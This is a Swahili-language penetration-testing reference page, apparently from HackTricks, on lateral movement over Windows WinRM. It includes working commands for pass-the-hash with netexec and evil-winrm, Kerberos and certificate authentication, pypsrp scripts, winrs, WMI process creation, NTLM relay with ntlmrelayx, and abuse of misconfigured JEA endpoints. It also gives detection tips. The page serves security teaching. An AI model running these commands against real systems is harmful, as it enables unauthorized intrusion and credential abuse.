# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ni mojawapo ya njia rahisi zaidi za **lateral movement** katika mazingira ya Windows, kwa sababu hukupa shell ya mbali kupitia **WS-Man/HTTP(S)** bila kuhitaji mbinu za kuunda huduma za SMB. Ikiwa target inafichua **5985/5986** na principal yako inaruhusiwa kutumia remoting, mara nyingi unaweza kutoka kwenye "creds halali" hadi kwenye "shell shirikishi" haraka sana.

Kwa maelezo kuhusu **protocol/service enumeration**, listeners, kuwezesha WinRM, `Invoke-Command`, na matumizi ya kawaida ya client, angalia:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Kwa nini waendeshaji hupendelea WinRM

- Hutumia **HTTP/HTTPS** badala ya SMB/RPC, hivyo mara nyingi hufanya kazi pale ambapo utekelezaji wa aina ya PsExec umezuiwa.
- Kwa kutumia **Kerberos**, huepuka kutuma credentials zinazoweza kutumika tena kwa target.
- Hufanya kazi vizuri kupitia zana za **Windows**, **Linux**, na **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Njia shirikishi ya PowerShell remoting huanzisha **`wsmprovhost.exe`** kwenye target chini ya muktadha wa mtumiaji aliyethibitishwa, ambayo kiutendaji ni tofauti na utekelezaji unaotegemea huduma.

## Muundo wa ufikiaji na mahitaji ya awali

Kwa vitendo, **mambo matatu** huamua kama lateral movement kupitia WinRM itafanikiwa:

1. Target ina **WinRM listener** (`5985`/`5986`) na sheria za firewall zinazoruhusu ufikiaji.
2. Akaunti inaweza **kuthibitishwa** kwenye endpoint.
3. Akaunti inaruhusiwa **kufungua kipindi cha remoting**.

Njia za kawaida za kupata ufikiaji huo:

- Kuwa **Local Administrator** kwenye target.
- Uanachama katika **Remote Management Users** kwenye mifumo mipya, au **WinRMRemoteWMIUsers__** kwenye mifumo/vipengele ambavyo bado vinatumia kundi hilo.
- Haki za remoting zilizokabidhiwa wazi kupitia security descriptors za ndani / mabadiliko ya ACL za PowerShell remoting.

Ikiwa tayari unadhibiti mashine yenye haki za admin, kumbuka unaweza pia **kukabidhi ufikiaji wa WinRM bila uanachama kamili katika kundi la admin** kwa kutumia mbinu zilizoelezwa hapa:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Mambo ya kuzingatia kuhusu uthibitishaji wakati wa lateral movement

- **Kerberos inahitaji hostname/FQDN**. Ukiunganisha kwa kutumia IP, client kwa kawaida hubadilisha na kutumia **NTLM/Negotiate**.
- Katika hali za **workgroup** au mipaka ya trust kati ya mifumo, NTLM mara nyingi huhitaji **HTTPS** au target iongezwe kwenye **TrustedHosts** ya client.
- Kwa akaunti za **local** zinazotumia Negotiate kwenye workgroup, vizuizi vya mbali vya UAC vinaweza kuzuia ufikiaji isipokuwa utumie akaunti ya Administrator iliyojengewa ndani au `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting hutumia **`HTTP/<host>` SPN** kwa chaguomsingi. Katika mazingira ambamo `HTTP/<host>` tayari imesajiliwa kwa akaunti nyingine ya huduma, Kerberos ya WinRM inaweza kushindwa kwa `0x80090322`; tumia SPN iliyobainishwa kwa port au badili utumie **`WSMAN/<host>`** pale SPN hiyo inapopatikana.<sup>[[3]](#references)</sup>

Ukipata credentials halali wakati wa password spraying, kuzithibitisha kupitia WinRM mara nyingi ndiyo njia ya haraka zaidi ya kuangalia kama zinaweza kukupa shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement kutoka Linux kwenda Windows

### NetExec / CrackMapExec kwa uthibitishaji na utekelezaji wa mara moja

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM kwa interactive shells

`evil-winrm` bado ndiyo chaguo rahisi zaidi la interactive kutoka Linux kwa sababu inasaidia **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, uhamishaji wa faili, na upakiaji wa PowerShell/.NET kwenye memory.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Hali maalum ya Kerberos SPN: `HTTP` dhidi ya `WSMAN`

Wakati SPN ya kawaida ya **`HTTP/<host>`** inaposababisha hitilafu za Kerberos, jaribu kuomba/ kutumia tiketi ya **`WSMAN/<host>`** badala yake. Hali hii hutokea katika mipangilio ya kampuni iliyoimarishwa au isiyo ya kawaida ambapo **`HTTP/<host>`** tayari imehusishwa na akaunti nyingine ya huduma.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Hili pia ni muhimu baada ya matumizi mabaya ya **RBCD / S4U** unapounda au kuomba tiketi ya huduma ya **WSMAN** mahususi badala ya tiketi ya jumla ya `HTTP`.

### Uthibitishaji unaotumia cheti

WinRM pia hutumia **uthibitishaji wa cheti cha mteja**, lakini cheti lazima kiunganishwe na **akaunti ya ndani** kwenye lengo. Kwa mtazamo wa mshambuliaji, hili ni muhimu unapokuwa:

- umeiba/kuhamisha cheti halali cha mteja na ufunguo wake binafsi ambao tayari umeunganishwa kwa WinRM;
- umetumia vibaya **AD CS / Pass-the-Certificate** kupata cheti cha principal kisha kuhamia kwenye njia nyingine ya uthibitishaji;
- unafanya kazi katika mazingira yanayoepuka kimakusudi matumizi ya nenosiri kwa ufikiaji wa mbali.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM si ya kawaida sana ikilinganishwa na auth ya password/hash/Kerberos, lakini inapopatikana, inaweza kutoa njia ya **passwordless lateral movement** inayoendelea kufanya kazi hata baada ya kubadilisha password.

### Python / automation kwa kutumia `pypsrp`

Ikiwa unahitaji automation badala ya shell ya operator, `pypsrp` hukupa WinRM/PSRP kutoka Python, ikiwa na usaidizi wa **NTLM**, **certificate auth**, **Kerberos**, na **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Ikiwa unahitaji udhibiti mahususi zaidi kuliko ule wa wrapper ya kiwango cha juu ya `Client`, API za kiwango cha chini za `WSMan` + `RunspacePool` zinafaa kwa matatizo mawili ya kawaida ya operator:

- kulazimisha **`WSMAN`** kuwa huduma/SPN ya Kerberos badala ya matarajio chaguomsingi ya `HTTP` yanayotumiwa na wateja wengi wa PowerShell;
- kuunganisha kwenye endpoint isiyo chaguomsingi ya PSRP, kama vile usanidi wa kipindi wa **JEA** / maalum, badala ya `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Endpoints maalum za PSRP na JEA ni muhimu wakati wa lateral movement

Kuthibitishwa kwa mafanikio kwa WinRM **hakumaanishi** kila mara kwamba unaingia kwenye endpoint chaguomsingi isiyo na vizuizi ya `Microsoft.PowerShell`. Mazingira yaliyokomaa yanaweza kuwa na **mipangilio maalum ya session** au endpoints za **JEA** zenye ACL na tabia zao za run-as.<sup>[[1]](#references)</sup>

Ikiwa tayari unaweza kutekeleza code kwenye host ya Windows na unataka kuelewa ni sehemu zipi za remoting zilizopo, orodhesha endpoints zilizosajiliwa:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Wakati endpoint yenye manufaa ipo, ilenge moja kwa moja badala ya kutumia default shell:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Madhara ya kiutendaji ya mashambulizi:

- Endpoint **iliyowekewa vizuizi** bado inaweza kutosha kwa lateral movement ikiwa inatoa cmdlet/function zinazofaa tu kwa udhibiti wa huduma, ufikiaji wa faili, uundaji wa process, au utekelezaji wa amri za .NET / nje.
- Jukumu la **JEA lililosanidiwa vibaya** linaweza kuwa na thamani kubwa hasa likitoa amri hatari kama `Start-Process`, wildcards pana, providers zinazoweza kuandikiwa, au proxy functions maalum zinazokuruhusu kukwepa vizuizi vilivyokusudiwa.
- Endpoints zinazotumia **RunAs virtual accounts** au **gMSAs** hubadilisha muktadha wa usalama unaotumika kwa amri unazoendesha. Hasa, endpoint inayotumia gMSA inaweza kutoa **utambulisho wa mtandao kwenye second hop** hata wakati session ya kawaida ya WinRM ingekumbana na tatizo la kawaida la delegation.

Kwa endpoint maalum iliyowekewa vizuizi, kagua ruhusa zake halisi za amri na script kando: orodha fupi ya `Get-Command` pekee haithibitishi kuwa `.ps1` iliyopo haiwezi kuendeshwa. [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) hudhibiti wazi ni njia zipi za script zinaweza kutumiwa; endpoints nyingine maalum zinaweza kutumia kanuni tofauti za session. Ikiwa script inayoruhusiwa inatumia `SecureString` iliyohifadhiwa kuunda credential ya host nyingine, blob iliyoundwa bila key iliyoainishwa hutumia [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), na kwa kawaida huhitaji muktadha wa mtumiaji na mashine iliyoilinda ili kuifungua. Kagua ACL ya script, ruhusa za kuitumia, utambulisho wa run-as, na haki za credential zinazotumika baadaye kabla ya kuchukulia source inayoweza kuandikiwa au blob iliyonakiliwa kuwa njia ya escalation kati ya hosts. Usichapishe thamani iliyolindwa wakati wa enumeration isiyobadilisha mfumo.

Kwa JEA custom function inayopokea njia ya faili, kagua pamoja ACL ya endpoint iliyosajiliwa, role capability iliyounganishwa, na utambulisho halisi wa run-as. Caller anaweza kuwa na `NoLanguage` huku function body ikiendeshwa katika language mode chaguomsingi ya mfumo; virtual account pia inaweza kuwa na haki za local administrator. Ikiwa function inakagua directory inayoruhusiwa kwa kutumia string prefix ghafi na baadaye kusoma njia iliyotolewa, vipengele vya `..` vinaweza kuelekeza nje ya directory hiyo. Mpaka halisi ni njia iliyotatuliwa chini ya utambulisho wa function, si language mode ya caller wala prefix inayoonekana. Thibitisha function inayoweza kufikiwa na ukaguzi wake wa njia ya mwisho kabla ya kuchukulia faili ya `.psrc` au `.pssc` inayosomeka kuwa ugunduzi wa usomaji wa faili wenye upendeleo. Angalia mwongozo wa Microsoft kuhusu [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) na [security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` imejengewa ndani na ni muhimu unapotaka **utekelezaji wa amri wa WinRM asilia** bila kufungua session ya mwingiliano ya PowerShell remoting:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Bendera mbili ni rahisi kusahau na ni muhimu katika matumizi halisi:

- `/noprofile` mara nyingi huhitajika wakati principal ya mbali **si** msimamizi wa ndani.
- `/allowdelegate` huwezesha remote shell kutumia credentials zako dhidi ya **host ya tatu** (kwa mfano, wakati amri inahitaji `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Kiutendaji, `winrs.exe` mara nyingi husababisha mnyororo wa michakato ya mbali unaofanana na:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Hili linafaa kukumbuka kwa sababu linatofautiana na exec inayotumia huduma na vipindi shirikishi vya PSRP.

### `winrm.cmd` / WS-Man COM badala ya PowerShell remoting

Unaweza pia kutekeleza kupitia **usafirishaji wa WinRM** bila kutumia `Enter-PSSession`, kwa kuomba madarasa ya WMI kupitia WS-Man. Hii huhifadhi usafirishaji kama WinRM huku primitive ya utekelezaji wa mbali ikiwa **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Mbinu hiyo ni muhimu wakati:

- Ufuatiliaji wa PowerShell logging ni mkali.
- Unataka **WinRM transport** lakini si workflow ya kawaida ya PS remoting.
- Unaunda au unatumia tooling maalum inayotumia COM object ya **`WSMan.Automation`**.

## NTLM relay kwa WinRM (WS-Man)

Wakati SMB relay imezuiwa na signing na LDAP relay ina vikwazo, **WS-Man/WinRM** bado inaweza kuwa lengo la relay linalovutia. `ntlmrelayx.py` ya kisasa inajumuisha **WinRM relay servers** na inaweza kufanya relay kwenda kwenye targets za **`wsman://`** au **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Vidokezo viwili vya vitendo:

- Relay hutumika zaidi wakati target inakubali **NTLM** na principal iliyorelayiwa inaruhusiwa kutumia WinRM.
- Msimbo wa hivi karibuni wa Impacket hushughulikia mahususi maombi ya **`WSMANIDENTIFY: unauthenticated`**, ili probe za aina ya `Test-WSMan` zisivuruge mtiririko wa relay.

Kwa vikwazo vya multi-hop baada ya kupata session ya kwanza ya WinRM, angalia:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC na vidokezo vya kugundua

- **Interactive PowerShell remoting** kwa kawaida huunda **`wsmprovhost.exe`** kwenye target.
- **`winrs.exe`** kwa kawaida huunda **`winrshost.exe`** kisha child process iliyoombwa.
- Endpoints maalum za **JEA** zinaweza kutekeleza vitendo kama akaunti pepe za **`WinRM_VA_*`** au kama **gMSA** iliyosanidiwa, jambo linalobadilisha telemetry na tabia ya second-hop ikilinganishwa na shell ya kawaida ya user-context.<sup>[[1]](#references)</sup>
- Tarajia telemetry ya **network logon**, matukio ya huduma ya WinRM, na logging ya PowerShell operational/script-block ikiwa unatumia PSRP badala ya `cmd.exe` ya moja kwa moja.
- Ikiwa unahitaji amri moja tu, `winrs.exe` au utekelezaji wa WinRM wa mara moja unaweza kuwa na kelele kidogo kuliko session ya remoting inayoendelea kwa muda mrefu.
- Ikiwa Kerberos inapatikana, pendelea **FQDN + Kerberos** badala ya IP + NTLM ili kupunguza matatizo ya trust na mabadiliko yasiyofaa ya `TrustedHosts` upande wa client.

## References

- [1] [Microsoft: Mambo ya kuzingatia kuhusu usalama wa JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Hitilafu `0x80090322` wakati wa kuunganisha PowerShell kwenye seva ya mbali kupitia WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
